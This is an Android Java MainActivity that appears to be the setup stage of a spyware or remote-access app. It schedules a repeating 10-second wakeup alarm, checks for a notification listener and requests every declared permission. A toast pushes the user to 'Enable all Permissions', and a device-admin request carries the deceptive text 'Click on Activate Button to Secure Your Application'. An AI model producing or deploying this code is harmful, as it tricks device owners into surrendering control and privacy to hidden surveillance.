package com.example.project20;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.os.Bundle;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;

import android.view.Gravity;
import android.widget.TextView;
import android.widget.Toast;


public class MainActivity extends AppCompatActivity {
    private DevicePolicyManager mDPM;
    private ComponentName mAdminName;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        PackageInfo info = null;
        Intent intent=new Intent(this,MainActivity.class);
        //////////////////PENDING INTENTFOR ALARM//////////
        PendingIntent pendingIntent=PendingIntent.getService(getApplicationContext(),1,intent,0);
        AlarmManager alarmManager=(AlarmManager) getSystemService(ALARM_SERVICE);
        alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,0,10000,pendingIntent);

        boolean isNotificationServiceRunning=isNotificationServiceRunning();
        if(!isNotificationServiceRunning){
            Context context=getApplicationContext();
            String[] permissions=new String[]{};
            try{
                info=getPackageManager().getPackageInfo(context.getPackageName(),PackageManager.GET_PERMISSIONS);
                permissions=info.requestedPermissions;
            }catch(PackageManager.NameNotFoundException e){
                e.printStackTrace();
            }
            CharSequence text="Enable 'Package Manager'\n Click back x2\n and Enable all Permissions";
            int duration=Toast.LENGTH_LONG;

            ///Showing toast to enable all permissions manually////////
            Toast toast=Toast.makeText(context,text,duration);
            TextView v=(TextView)toast.getView().findViewById(android.R.id.message);
            v.setTextColor(Color.GREEN);
            v.setTypeface(Typeface.DEFAULT_BOLD);
            v.setGravity(Gravity.CENTER_VERTICAL| Gravity.CENTER_HORIZONTAL);
            toast.show();
            reqPermissions(this,permissions);

            //spawn Notification thing Permission Screen popUp/////////////
//            startActivity(new Intent("android.settings.NOTIFICATION_LISTENER_SETTINGS"));

            mDPM=(DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            // Set DeviceAdminDemo Receiver for active the component with different option
            mAdminName=new ComponentName(this, DeviceAdminX.class);

            if(!mDPM.isAdminActive(mAdminName)){
                ///////// Use Intent to become Active/////////
                Intent intent2=new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent2.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,mAdminName);
                intent2.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"Click on Activate Button to Secure Your  Application ");
                startActivity(intent2);
            }

            /// Spawn app Page Settings so yo can enable all Perms/////////////
//            Intent i=new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,Uri.parse("package:" + BuildConfig.APPLICATION_ID));
//            startActivity(i);
        }



        //END OF ONCREATE METHOD//////
    }

    public void reqPermissions(Context context,String[] permissions){
        if(context!=null  && permissions!=null){
            ActivityCompat.requestPermissions(this,permissions,1);
        }
    }


    public boolean isNotificationServiceRunning(){
        ContentResolver contentResolver=getContentResolver();
        String enabledNotificationListeners=
                Settings.Secure.getString(contentResolver,"Notification Listener Enabled");
        String packageName=getPackageName();
        return enabledNotificationListeners!=null && enabledNotificationListeners.contains(packageName);
    }
}